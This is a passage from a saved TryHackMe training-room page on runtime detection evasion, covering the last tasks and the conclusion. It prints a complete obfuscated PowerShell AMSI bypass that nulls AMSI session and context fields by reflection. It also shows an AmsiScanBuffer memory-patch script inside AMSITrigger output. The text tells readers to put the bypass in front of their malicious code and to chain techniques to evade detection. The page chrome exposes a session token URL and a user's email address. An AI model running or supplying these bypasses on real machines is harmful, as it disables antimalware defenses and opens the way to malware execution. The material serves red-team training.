<p><span>Below is an example of an obfuscated <a class="aq1DT3sy glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;aq1DT3sy&#39;)">PowerShell</a> snippet from amsi.fail</span></p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token variable">$d</span>=<span class="token variable">$null</span><span class="token punctuation">;</span><span class="token variable">$qcgcjblv</span>=<span class="token punctuation">[</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Sys'</span><span class="token operator">+</span><span class="token string">'tem'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>NoRMALizE<span class="token punctuation">(</span><span class="token namespace">[CHar]</span><span class="token punctuation">(</span>70<span class="token operator">*</span>66<span class="token operator">/</span>66<span class="token punctuation">)</span><span class="token operator">+</span><span class="token namespace">[CHaR]</span><span class="token punctuation">(</span>77<span class="token operator">+</span>34<span class="token punctuation">)</span><span class="token operator">+</span><span class="token namespace">[cHaR]</span><span class="token punctuation">(</span><span class="token namespace">[bYTe]</span>0x72<span class="token punctuation">)</span><span class="token operator">+</span><span class="token namespace">[ChAR]</span><span class="token punctuation">(</span><span class="token namespace">[bYtE]</span>0x6d<span class="token punctuation">)</span><span class="token operator">+</span><span class="token namespace">[chaR]</span><span class="token punctuation">(</span>68<span class="token operator">*</span>10<span class="token operator">/</span>10<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-replace</span> <span class="token namespace">[cHAR]</span><span class="token punctuation">(</span>92<span class="token punctuation">)</span><span class="token operator">+</span><span class="token namespace">[char]</span><span class="token punctuation">(</span><span class="token namespace">[ByTE]</span>0x70<span class="token punctuation">)</span><span class="token operator">+</span><span class="token namespace">[cHar]</span><span class="token punctuation">(</span><span class="token namespace">[bYtE]</span>0x7b<span class="token punctuation">)</span><span class="token operator">+</span><span class="token namespace">[Char]</span><span class="token punctuation">(</span>69<span class="token operator">+</span>8<span class="token punctuation">)</span><span class="token operator">+</span><span class="token namespace">[ChAr]</span><span class="token punctuation">(</span><span class="token namespace">[bYTE]</span>0x6e<span class="token punctuation">)</span><span class="token operator">+</span><span class="token namespace">[ChaR]</span><span class="token punctuation">(</span><span class="token namespace">[BYtE]</span>0x7d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span>Marshal<span class="token punctuation">]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token punctuation">(</span>9076<span class="token operator">+</span>7561<span class="token operator">-</span>7561<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pkgzwpahfwntq</span>=<span class="token string">"+('lwbj'+'cymh').NORmaliZe([CHar]([byTe]0x46)+[char](111)+[ChAR]([ByTE]0x72)+[chaR](109*73/73)+[ChAR]([ByTE]0x44)) -replace [char]([bytE]0x5c)+[Char](112*106/106)+[char]([bYte]0x7b)+[chAR]([BYtE]0x4d)+[CHAR](110+8-8)+[CHAr]([BytE]0x7d)"</span><span class="token punctuation">;</span><span class="token namespace">[Threading.Thread]</span>::<span class="token function">Sleep</span><span class="token punctuation">(</span>1595<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">"<span class="token function">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Sys'</span><span class="token operator">+</span><span class="token string">'tem'</span><span class="token punctuation">)</span></span>.NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).<span class="token function">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Mãnâge'</span><span class="token operator">+</span><span class="token string">'ment'</span><span class="token punctuation">)</span></span>.NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).<span class="token function">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Àutõmâtî'</span><span class="token operator">+</span><span class="token string">'ôn'</span><span class="token punctuation">)</span></span>.NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).<span class="token function">$<span class="token punctuation">(</span><span class="token namespace">[CHAR]</span><span class="token punctuation">(</span><span class="token namespace">[ByTe]</span>0x41<span class="token punctuation">)</span></span>+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">"<span class="token function">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'àmsí'</span><span class="token operator">+</span><span class="token string">'Sess'</span><span class="token operator">+</span><span class="token string">'íón'</span><span class="token punctuation">)</span></span>.norMALiZE([CHaR](70*49/49)+[chAr](87+24)+[ChaR]([bytE]0x72)+[chAr](109)+[chAR](68+43-43)) -replace [CHAr](92)+[chAr]([byTe]0x70)+[CHAr]([bYTE]0x7b)+[cHAr](77*71/71)+[CHar]([bYtE]0x6e)+[char](125+49-49))"</span><span class="token punctuation">,</span> <span class="token string">"NonPublic,Static"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">"<span class="token function">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Sys'</span><span class="token operator">+</span><span class="token string">'tem'</span><span class="token punctuation">)</span></span>.NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).<span class="token function">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Mãnâge'</span><span class="token operator">+</span><span class="token string">'ment'</span><span class="token punctuation">)</span></span>.NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).<span class="token function">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Àutõmâtî'</span><span class="token operator">+</span><span class="token string">'ôn'</span><span class="token punctuation">)</span></span>.NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).<span class="token function">$<span class="token punctuation">(</span><span class="token namespace">[CHAR]</span><span class="token punctuation">(</span><span class="token namespace">[ByTe]</span>0x41<span class="token punctuation">)</span></span>+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">"<span class="token function">$<span class="token punctuation">(</span><span class="token namespace">[chAR]</span><span class="token punctuation">(</span><span class="token namespace">[byTe]</span>0x61<span class="token punctuation">)</span></span>+[Char](109+52-52)+[cHar](46+69)+[CHar]([byTe]0x69)+[CHAR]([BYTe]0x43)+[Char]([ByTe]0x6f)+[chAR](110)+[chaR](116*47/47)+[cHar](101)+[CHAR]([bYte]0x78)+[CHaR]([ByTE]0x74))"</span><span class="token punctuation">,</span> <span class="token string">"NonPublic,Static"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token variable">$qcgcjblv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>You can attach this bypass at the beginning of your malicious code as with previous bypasses or run it in the same session before executing malicious code.</p>
<hr>
<p><a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a> allows attackers to automatically identify strings that are flagging signatures to modify and break them. This method of bypassing AMSI is more consistent than others because you are making the file itself clean.</p>
<p>The syntax for using amsitrigger is relatively straightforward; you need to specify the file or URL and what format to scan the file. Below is an example of running amsitrigger.<br></p>

<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            AMSI Trigger Example
        </div>
        <pre class="terminal-code language-html" tabindex="0"><code class=" language-shell-session language-html"></code><pre style="color:#bac8d4;font-size:1em">C:\Users\Tryhackme\Tools&gt;AmsiTrigger_x64.exe -i "bypass.ps1" -f 3
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, '<span style="color:red">AmsiScanBuffer</span>');
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]<span style="color:red">::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy(</span>$buf, 0, $BufferAddress, 6);</pre></pre></div></div>

<p>Signatures are highlighted in red; you can break these signatures by encoding, obfuscating, etc.<br></p>
</div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above and continue to the next task.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="8">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-9">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse9" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 9                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Conclusion
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse9" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Runtime detections and AMSI are only one of many detections and mitigations you can face when employing techniques against a hardened or up-to-date device.</p><p>These bypasses can be used on their own or in a chain with other exploits and techniques to ultimately - evade all the things.</p><p>It is important to keep these tools from this room in your back pocket. You cannot solely rely on them to evade detections, but you can get around and deter a lot of detections using the discussed techniques.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above and continue learning!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="9">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Runtime Detection Evasion_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Runtime Detection Evasion_files/9e946af210ae86d6fbfda480d958b3fe.gif"> 
        <a class="green-link" href="https://tryhackme.com/p/Cryillic">Cryillic</a></p><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 4685 users are in here and this room is 486 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox" class="">
<div id="room-attackbox" style="display: none;">
<div id="attackbox-machine-instance">
<div id="room-attackbox-loading" style="display: none;">
    </div>
<div id="room-attackbox-vm-view" style=""></div>
</div>
<div id="attackbox-machine-options" class="">
<div class="d-flex">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen" href="https://remote-eu-08.tryhackme.tech/#/client/MjM2OTg3MQBjAG15c3Fs?token=A29F079410D50B36CE6588E0B37D46AFF58D230619617BA5F0F940C10F557746" class="clear-link"><div><i class="far fa-expand-alt"></i></div></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
<div class="d-flex" id="room-attackbox-tabs"><div class="tab-active" data-id="i-08801b2ac1d899b07" onclick="switchWebBasedTab(&#39;i-08801b2ac1d899b07&#39;)">Runtime Sandbox<div></div></div></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires">1h 25m 38s</div>
</div>
</div>
<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-light-gray">
<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
</div>
<div class="modal-body">
<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4">
<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"><div onclick="getModalAttackBoxPubIP()">Reveal IP</div></code></li>
<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14">MACHINE_IP</code> <span class="size-14">(Use this for your reverse shells)</span></li>
<li class="mt-1">Username: <code id="browser-username" class="dark size-14">N/a</code></li>
<li class="mt-1">Password: <code id="browser-password" class="dark size-14">N/a</code></li>
<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14">rdp</code></li>
</ul>
<hr class="hr-min">
<ul class="text-lgray mb-0">
<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Runtime Detection Evasion_files/clipboard.gif"></details></li>
<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div id="award-modal-badges"></div>
<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" style="display: none;" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">If the flag does not appear, navigate to the desktop in a command prompt and execute the script again.</div>
</div>
</div>
</div>
<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">...</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center"></div>
<div class="modal-footer"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Runtime Detection Evasion_files/modal.css">
<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" style="display: none;" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content" id="roomCompletedModalContent">
<div class="modal-body text-center">
<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
<i class="fad fa-times-circle"></i>
</button>
<div class="icon-box">
<i class="fad fa-badge-check"></i>
</div>
<h3 class="text-accent mt-5">Congratulations</h3>
<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share"><a target="_blank" class="twitterIcon" href="https://twitter.com/intent/tweet?url=https://tryhackme.com/room/runtimedetectionevasion&amp;via=realtryhackme&amp;text=Runtime%20Detection%20Evasion%20-%20I%20have%20just%20completed%20this%20room!%20Check%20it%20out:%20&amp;hashtags=tryhackme,Windows,AMSI,C#,PowerShell,Evasion,RedTeam,Detection,Bypass,runtimedetectionevasion"><button type="button" class="twitter-btn btn btn-primary" onclick="shareMediaEvent(&#39;room&#39;, &#39;runtimedetectionevasion&#39;, &#39;twitter&#39;)">
        <i class="fab fa-twitter"></i> Twitter
      </button></a> <a target="_blank" class="facebookIcon" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftryhackme.com%2Froom%2Fruntimedetectionevasion"><button type="button" class="facebook-btn btn btn-primary" onclick="shareMediaEvent(&#39;room&#39;,&#39;runtimedetectionevasion&#39;, &#39;facebook&#39;)">
      <i class="fab fa-facebook-f"></i> Facebook
    </button></a> <a target="_blank" class="linkedinIcon" href="https://www.linkedin.com/sharing/share-offsite/?url=https://tryhackme.com/room/runtimedetectionevasion"><button type="button" class="linkedin-btn btn btn-primary" onclick="shareMediaEvent(&#39;room&#39;, &#39;runtimedetectionevasion&#39;, &#39;linkedin&#39;)">
      <i class="fab fa-linkedin-in"></i> LinkedIn
      </button></a></h2>
<div id="ticket-info"></div> 
<p class="faded mt-1" id="roomFeedbackBtn">
<small>
<button class="bg-white border-0">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
<input type="hidden" name="_csrf" value="XnGmCUDv-rVJSc2Z0RIzAc1yAJX6JRV4NwV0">
<input type="hidden" name="roomCode" value="runtimedetectionevasion">
<input type="hidden" name="type" value="rooms">
<input type="hidden" name="redirect" value="json">
<div class="form-group">
<label class="mb-0" for="like">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="dislike">What don't you like about the room?</label>
<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
</form>
<p class="mt-2 mb-0" id="formMessage"></p>
</div>

        <a class="next-room" href="https://tryhackme.com/jr/monitoringevasion" onclick="clickNextRoomEvent(&#39;runtimedetectionevasion&#39;, &#39;monitoringevasion&#39;, &#39;from_popup&#39;)">
          <div class="modal-footer d-flex justify-content-center">
            <i class="fad fa-angle-double-right mr-2"></i>
            Next Room: Evading Logging and Monitoring
          </div>
        </a></div>
</div>
<script>
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Runtime Detection Evasion_files/roomFeedback.js"></script>
<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<div class="row vertical-align-custom mb-0">
<div class="col-sm-5 pr-0">
<p class="size-18 bold">Use a VPN</p>
<p>Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24">
or
</div>
<div class="col-sm-5 pl-0">
<p class="size-18 bold">Use the AttackBox</p>
<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
<h3 class="text-warning">Expiring Soon</h3>
<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
<h3 class="text-danger">Expired Machine</h3>
<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue text-center p-3">
<h4 class="mb-0 m-auto">How to access machines</h4>
<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0">
<div class="col-sm-6">
<img src="./TryHackMe _ Runtime Detection Evasion_files/connect_openvpn_short.png">
<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6">
<img src="./TryHackMe _ Runtime Detection Evasion_files/connect_kali_short.png">
<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title" id="roomAlertModalTitle"></h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body" id="roomAlertModalBody"></div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="resetUserProgressModal" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">Reset Your Progress</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header  modal-dark-blue">
<h5 class="modal-title">Cloud Information</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<ul class="nav nav-tabs">
<li class="nav-item pr-2">
<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/runtimedetectionevasion#env-tab">Environment</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/runtimedetectionevasion#creds-tab">Credentials</a>
</li>
</ul>
<div class="tab-content">
<div class="tab-pane active" id="env-tab"></div>
<div class="tab-pane" id="creds-tab"></div>
</div>
</div>
<div class="modal-footer" id="cloudEnvModalFooter">
</div>
</div>
</div>
</div>
<div class="modal fade" id="setNameModal" role="dialog">
<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title">Generating Your Certificate</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body container">
<div class="row">
<div class="col-6">
<h5 class="bold">Hey there, what's your name?</h5>
<p class="text-secondary">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group">
<label>Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
</div>
</div>
<div class="col-6">
<h5 class="bold">You're here incognito? It's ok!</h5>
<p class="text-secondary">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row">
<div class="col-6">
<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
Generate with my full name
</button>
</div>
<div class="col-6">
<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Runtime Detection Evasion_files/certificateName.js"></script>
<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-links">
<div id="unstuck-video" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-play"></i></div>
<div class="unstuck-icon-text">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
<div class="unstuck-icon-text">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" href="https://tryhackme.com/forum/thread/6232518c0d40d20043b26bd0">
<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
<div class="unstuck-icon-text">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-books"></i></div>
<div class="unstuck-icon-text">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
